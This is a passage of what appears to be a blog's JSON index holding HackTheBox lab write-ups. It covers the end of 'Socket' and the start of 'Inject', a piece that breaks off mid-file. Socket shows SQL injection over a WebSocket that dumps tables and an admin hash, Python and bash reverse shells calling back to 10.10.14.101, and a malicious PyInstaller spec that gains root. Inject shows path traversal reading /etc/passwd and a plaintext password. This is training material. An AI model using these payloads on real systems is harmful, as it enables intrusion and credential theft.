{\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 1-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT, answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 2-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE info (id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT, value TEXT)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 3-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE reports (id INTEGER PRIMARY KEY AUTOINCREMENT, reporter_name TEXT, subject TEXT, description TEXT, reported_date DATE)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 4-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE sqlite_sequence(name,seq)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 5-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password DATE, role TEXT)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 6-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} Users database is a clear standout, and may contain valuable credentials:\n1 2 3 4 5 6 7 8 9 10 11 12 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT username,password,role,NULL FROM users where id = 1-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;0c090c365fa0559b151a43e0fea39710\u0026#34;, \u0026#34;released_date\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT username,password,role,NULL FROM users where id = 2-- -\u0026#34;} {\u0026#34;message\u0026#34;: \u0026#34;Invalid version!\u0026#34;} After dumping credentials for admin, there are no other entries in the table. Before leaving the sql database, we should explore some of the other tables. This turned out to be a good idea, because more useful information is found in the answers table:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 1-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT, answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT answered_by,answer,status,NULL FROM answers where id = 1-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;Hello Json,\\n\\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\\n\\nThomas Keller\u0026#34;, \u0026#34;released_date\u0026#34;: \u0026#34;PENDING\u0026#34;, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT answered_by,answer,status,NULL FROM answers where id = 2-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;Hello Mike,\\n\\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\\n\\nThomas Keller\u0026#34;, \u0026#34;released_date\u0026#34;: \u0026#34;PENDING\u0026#34;, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT answered_by,answer,status,NULL FROM answers where id = 3-- -\u0026#34;} {\u0026#34;message\u0026#34;: \u0026#34;Invalid version!\u0026#34;} We see messages from an id of admin, where he signs off as Thomas Keller. This can give us potential ideas as to what username(s) might be on the machine.\nBonus: using SQLMap to dump the database Because the SQL injection is done through a WebSocket interaction, utilizing SQLMap is a little more complex than usual. Although SQLMap has WebSocket compatibility, it has been difficult to properly launch in my experience. However, there is a nice blog article that highlights a clever approach to using sqlmap over a WebSocket. In this approach, the author sets up a python server script that will receive SQLMap\u0026rsquo;s queries, transform the payload to a relevant JSON query, then redirect it to the WebSocket of interest.\nFirst, the python redirection script needs to be updated to our situation. The ws_server value must be changed, and also the payload replace line must be altered. Line 6:\n1 ws_server = \u0026#34;ws://10.10.11.206:5789/version\u0026#34; Line 14:\n1 2 message = unquote(payload).replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\\\\\\\u0026#34;\u0026#39;) # replacing \u0026#34; with \u0026#39; to avoid breaking JSON structure data = \u0026#39;{\u0026#34;version\u0026#34;:\u0026#34;%s\u0026#34;}\u0026#39; % message Now we can run the python script, and in a new tab initiate sqlmap.\n1 2 3 $ python wserv.py [+] Starting MiddleWare Server [+] Send payloads in http://localhost:8081/?id=* And finally run sqlmap:\n1 $ sqlmap -u http://localhost:8081/?id=0.0.1 --tables --dump SQLMap output: Database: Table: reports\n[2 entries]\n1 2 3 4 | id | subject | description | reported_date | reporter_name | |----|---------------------------|---------------------------------------------------------------------------------------------------------------------|---------------|---------------| | 1 | Accept JPEG files | Is there a way to convert JPEG images with this tool? Or should I convert my JPEG to PNG and then use it? | 13/08/2022 | Jason | | 2 | Converting non-ascii text | When I try to embed non-ascii text, it always gives me an error. It would be nice if you could take a look at this. | 22/09/2022 | Mike | Database: Table: users\n[1 entry]\n1 2 3 | id | role | password | username | |----|-------|----------------------------------|----------| | 1 | admin | 0c090c365fa0559b151a43e0fea39710 | admin | Database: Table: answers\n[2 entries]\n1 2 3 4 | id | report_id | answer | status | FOREIGN | answered_by | answered_date | |----|-----------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------|---------|-------------|---------------| | 1 | \u0026lt;blank\u0026gt; | Hello Json, As if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version. | PENDING | \u0026lt;blank\u0026gt; | admin | 17/08/2022 | | 2 | \u0026lt;blank\u0026gt; | Hello Mike, We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now! Thomas Keller | PENDING | \u0026lt;blank\u0026gt; | admin | 25/09/2022 | SQLMap produces everything very fast in case we missed something, but it was a little tricky to set up this time. If the SQLi type had been a blind injection, enumerating everything by hand can be extremely time consuming. It is good to know how we might make automation for this task possible.\nAuthenticating through ssh With exploration of the database finished, we can finally move on to the obtained Administrator credentials. Since it is information stored in the sqlite table, it is highly likely to be a password hash. Fortunately enough, we don\u0026rsquo;t even have to crack it ourselves. A quick trip over to crackstation, and we get the plaintext password immediately.\nWe now have creds as Admin:denjanjade122566\nTrying to log in through ssh:\n1 2 3 $ ssh admin@qreader.htb admin@qreader.htb\u0026#39;s password: Permission denied, please try again. The password doesn\u0026rsquo;t work for the user admin, but based on the other messages we gleaned from the database we know his name as well. On my first guessing combination, I land at a successful login for tkeller\n1 2 3 $ ssh tkeller@qreader.htb tkeller@qreader.htb\u0026#39;s password: Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-67-generic x86_64) One tool that might be helpful for generating usernames from full names is username_anarchy. In this case because of my lucky guess, I did not need to use.\nAt this point the user.txt is up for grabs.\nPrivilege Escalation Enumeration: Checking tkeller's sudo privileges,\n1 2 3 4 5 6 tkeller@socket:~$ sudo -l Matching Defaults entries for tkeller on socket: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User tkeller may run the following commands on socket: (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh We see that we can run build-installer.sh as any user, including root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 tkeller@socket:~$ cat /usr/local/sbin/build-installer.sh #!/bin/bash if [ $# -ne 2 ] \u0026amp;\u0026amp; [[ $1 != \u0026#39;cleanup\u0026#39; ]]; then /usr/bin/echo \u0026#34;No enough arguments supplied\u0026#34; exit 1; fi action=$1 name=$2 ext=$(/usr/bin/echo $2 |/usr/bin/awk -F\u0026#39;.\u0026#39; \u0026#39;{ print $(NF) }\u0026#39;) if [[ -L $name ]];then /usr/bin/echo \u0026#39;Symlinks are not allowed\u0026#39; exit 1; fi if [[ $action == \u0026#39;build\u0026#39; ]]; then if [[ $ext == \u0026#39;spec\u0026#39; ]] ; then /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2\u0026gt;/dev/null /home/svc/.local/bin/pyinstaller $name /usr/bin/mv ./dist ./build /opt/shared else echo \u0026#34;Invalid file format\u0026#34; exit 1; fi elif [[ $action == \u0026#39;make\u0026#39; ]]; then if [[ $ext == \u0026#39;py\u0026#39; ]] ; then /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2\u0026gt;/dev/null /root/.local/bin/pyinstaller -F --name \u0026#34;qreader\u0026#34; $name --specpath /tmp /usr/bin/mv ./dist ./build /opt/shared else echo \u0026#34;Invalid file format\u0026#34; exit 1; fi elif [[ $action == \u0026#39;cleanup\u0026#39; ]]; then /usr/bin/rm -r ./build ./dist 2\u0026gt;/dev/null /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2\u0026gt;/dev/null /usr/bin/rm /tmp/qreader* 2\u0026gt;/dev/null else /usr/bin/echo \u0026#39;Invalid action\u0026#39; exit 1; fi All binaries are defined by full path, so we cannot get an easy win through PATH abuse.\nLooking at segments where we might supply our own input, we can see under \u0026lsquo;build\u0026rsquo; and \u0026lsquo;make\u0026rsquo; options, we supply the file names following pyinstaller. Pyinstaller is used to compile easily-launchable binary files from python code. In this situation, pyinstaller is used so that the QReader code, written in python, can exist in a single executable for users to download. Pyinstaller compiling can be well customized through use of .spec files, which it uses to determine how to process your python script. More info can be found [here]](https://pyinstaller.org/en/stable/spec-files.html). Since we are running pyinstaller as root, perhaps we can define in the .spec file for root to do other actions.\nUsing the make script to produce a .spec template For testing around, I used a python rev shell script. The python file\u0026rsquo;s contents shouldn\u0026rsquo;t matter, but I figured why not.\nrev.py:\n1 2 3 4 5 6 7 8 9 import socket import subprocess import os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026#34;10.10.14.101\u0026#34;,8001)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) import pty; pty.spawn(\u0026#34;sh\u0026#34;) Running make once on this creates a .spec file for us to use and create our own executable:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 tkeller@socket:/tmp/$ sudo /usr/local/sbin/build-installer.sh make rev.py 384 INFO: PyInstaller: 5.6.2 384 INFO: Python: 3.10.6 387 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35 387 INFO: wrote /tmp/qreader.spec \u0026lt;...SNIP...\u0026gt; tkeller@socket:/tmp/$ cat qreader.spec # -*- mode: python ; coding: utf-8 -*- block_cipher = None a = Analysis( [\u0026#39;rev.py\u0026#39;], pathex=[], binaries=[], datas=[], hiddenimports=[], hookspath=[], hooksconfig={}, runtime_hooks=[], excludes=[], win_no_prefer_redirects=False, win_private_assemblies=False, cipher=block_cipher, noarchive=False, ) pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher) exe = EXE( pyz, a.scripts, a.binaries, a.zipfiles, a.datas, [], name=\u0026#39;qreader\u0026#39;, debug=False, bootloader_ignore_signals=False, strip=False, upx=True, upx_exclude=[], runtime_tmpdir=None, console=True, disable_windowed_traceback=False, argv_emulation=False, target_arch=None, codesign_identity=None, entitlements_file=None, ) Now that we have a proper .spec file, we can begin to make small changes that might allow us to execute actions as root.\nSubprocess execution in pyinstaller .spec file The pyinstaller documents appear to suggest this .spec file can also interpret python code. And so, I make a simple addition to it that will execute a .sh script and, in that script, I provide a simple reverse shell.\nrev.sh:\n1 2 #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.101/18 0\u0026gt;\u0026amp;1 At the top of the .spec file I include imports and a popen command:\n1 2 3 4 5 6 7 8 9 10 11 tkeller@socket:/tmp/1$ head qreader.spec # -*- mode: python ; coding: utf-8 -*- block_cipher = None import subprocess subprocess.Popen(\u0026#39;/tmp/rev.sh\u0026#39;, shell=True) a = Analysis( Now upon calling build, pyinstaller should invoke the .spec file and subsequently open my rev.sh as root, giving me an interactive session.\n1 2 3 4 5 6 7 8 9 10 tkeller@socket:/tmp/$ sudo /usr/local/sbin/build-installer.sh build qreader.spec 124 INFO: PyInstaller: 5.6.2 124 INFO: Python: 3.10.6 127 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35 130 INFO: UPX is not available. 131 INFO: Extending PYTHONPATH with paths [\u0026#39;/tmp/\u0026#39;] \u0026lt;...SNIP...\u0026gt; 8829 INFO: Building EXE from EXE-00.toc completed successfully. tkeller@socket:/tmp$ Meanwhile in another terminal session:\n1 2 3 4 $ nc -nvlp 8001 listening on [any] 8001 ... connect to [10.10.14.101] from (UNKNOWN) [10.10.11.206] 37536 root@socket:/tmp/1# Reflection The difficulty of this box is primarily focused in the WebSocket interaction, true to the box name. The SQLi vulnerability can be easily missed, and without extra help, SQLMap can give a lot of problems as well. As a final hit to those manually exploiting, retrieving the password hash is not enough information to access the box. However, once this challenge is overcome, privilege escalation to root authority is much simpler and flexible. I learned several new things on the box, in particular I appreciate learning about rayhan0x01\u0026rsquo;s solution to using SQLMap for WebSocket tasks.\n","date":"2023-07-15T15:06:40-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-socket/Socket_hu849eb59558b706146747b24028bb82f3_354031_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-socket/","title":"HackTheBox - Socket"},{"content":"Initial Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Nmap 7.92 scan initiated Sat Mar 11 16:01:55 2023 as: nmap -sCV -A -oN nmap_initial.txt 10.10.11.204 Nmap scan report for 10.10.11.204 Host is up (0.028s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA) | 256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA) |_ 256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519) 8080/tcp open nagios-nsca Nagios NSCA |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Mar 11 16:02:11 2023 -- 1 IP address (1 host up) scanned in 16.07 seconds We see a main page at port 8080 with a few pages immediately accessible: 10.10.11.204:8080/blogs 10.10.11.204:8080/upload 10.10.11.204:8080/register\nRegister is dead:\nBlogs is not very interactive. However, uploads lets us upload image files only.\nIn burp, a little exploration shows we can upload any file that ends in a .jpg or .png or other image extension. Trying to upload rev shell with name shell.php.png result is an image display error:\nAfter trying a few things, looking back in burpsuite or curl we see that our injected code is reflected back to us:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ curl -v http://10.10.11.204:8080/show_image?img=shell.php.png * Trying 10.10.11.204:8080... * Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0) \u0026gt; GET /show_image?img=shell.php.png HTTP/1.1 \u0026gt; Host: 10.10.11.204:8080 \u0026gt; User-Agent: curl/7.88.1 \u0026gt; Accept: */* \u0026gt; \u0026lt; HTTP/1.1 200 \u0026lt; Accept-Ranges: bytes \u0026lt; Content-Type: image/jpeg \u0026lt; Content-Length: 5493 \u0026lt; Date: Tue, 04 Jul 2023 20:24:18 GMT \u0026lt; \u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP // Copyright (C) 2007 pentestmonkey@pentestmonkey.net // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. The author accepts no liability // for damage caused by this tool. If these terms are not acceptable to you, then // do not use this tool. So, the reason it doesn\u0026rsquo;t show in firefox browser is because the header content-type describes image/jpeg, then the data described is plaintext. The browser tries to display an image from the information, which obviously doesn\u0026rsquo;t work.\nThe image url is very interesting, as it might allow for directory traversal, leading to unintended file reads: http://10.129.34.82:8080/show_image?img=shell.php.png. Looking for /etc/passwd:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 $ curl -v http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd * Trying 10.10.11.204:8080... * Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0) \u0026gt; GET /show_image?img=../../../../../../etc/passwd HTTP/1.1 \u0026gt; Host: 10.10.11.204:8080 \u0026gt; User-Agent: curl/7.88.1 \u0026gt; Accept: */* \u0026gt; \u0026lt; HTTP/1.1 200 \u0026lt; Accept-Ranges: bytes \u0026lt; Content-Type: image/jpeg \u0026lt; Content-Length: 1986 \u0026lt; Date: Tue, 04 Jul 2023 20:28:36 GMT \u0026lt; root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin frank:x:1000:1000:frank:/home/frank:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false sshd:x:113:65534::/run/sshd:/usr/sbin/nologin phil:x:1001:1001::/home/phil:/bin/bash fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin _laurel:x:997:996::/var/log/laurel:/bin/false * Connection #0 to host 10.10.11.204 left intact Foothold Enumeration with arbitrary file reading From here we find two users on the box, frank and Phil.\nUpon further inspection, I learned that the query can actually output the contents of folders, which is unusual for this type of vulnerability. In most cases, if the query is not a file that exists it will return an error.\n1 2 3 4 5 6 7 $ curl http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/ .bash_history .bashrc .cache .local .m2 .profile Hidden folders are shown as well, which may or may not come in handy.\nAfter exploring the contents of Frank\u0026rsquo;s home directory, we find an interesting file in .m2/settings.xml:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ curl http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2/settings.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;settings xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;servers\u0026gt; \u0026lt;server\u0026gt; \u0026lt;id\u0026gt;Inject\u0026lt;/id\u0026gt; \u0026lt;username\u0026gt;phil\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;DocPhillovestoInject123\u0026lt;/password\u0026gt; \u0026lt;privateKey\u0026gt;${user.home}/.ssh/id_dsa\u0026lt;/privateKey\u0026gt; \u0026lt;filePermissions\u0026gt;660\u0026lt;/filePermissions\u0026gt; \u0026lt;directoryPermissions\u0026gt;660\u0026lt;/directoryPermissions\u0026gt; \u0026lt;configuration\u0026gt;\u0026lt;/configuration\u0026gt; \u0026lt;/server\u0026gt; \u0026lt;/servers\u0026gt; \u0026lt;/settings\u0026gt; We now have login credentials for phil, with password DocPhillovestoInject123.\n1 2 3 4 5 6 7 8 $ ssh phil@10.10.11.204 The authenticity of host \u0026#39;10.10.11.204 (10.10.11.204)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:8MhHRO2LTR9G168dKL9vVmXYYb904O1gv5Eg1Q6njSU. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.11.204\u0026#39; (ED25519) to the list of known hosts. phil@10.10.11.204\u0026#39;s password: Permission denied, please try again. In an unexpected twist, the password doesn\u0026rsquo;t seem to work for phil or for frank. Examining /etc/ssh/sshd_config, i see this:\n1 2 3 4 5 6 7 8 9 10 # Authentication: DenyUsers phil #LoginGraceTime 2m #PermitRootLogin prohibit-password #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 #PubkeyAuthentication yes Perhaps the password for phil is correct, but ssh authentication is locked for him? Perhaps we will revisit this once we have access through a different avenue.\nLeveraging CVE 2022-22963 Exploring the source code documents with the file read exploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 $ curl http://10.10.11.204:8080/show_image?img=../../../../../../var/www/WebApp/pom.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.6.5\u0026lt;/version\u0026gt; \u0026lt;relativePath/\u0026gt; \u0026lt;!-- lookup parent from repository --\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;groupId\u0026gt;com.example\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;WebApp\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.0.1-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;name\u0026gt;WebApp\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;Demo project for Spring Boot\u0026lt;/description\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;java.version\u0026gt;11\u0026lt;/java.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.sun.activation\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javax.activation\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-thymeleaf\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-devtools\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;runtime\u0026lt;/scope\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-function-web\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;bootstrap\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.1.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;webjars-locator-core\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; 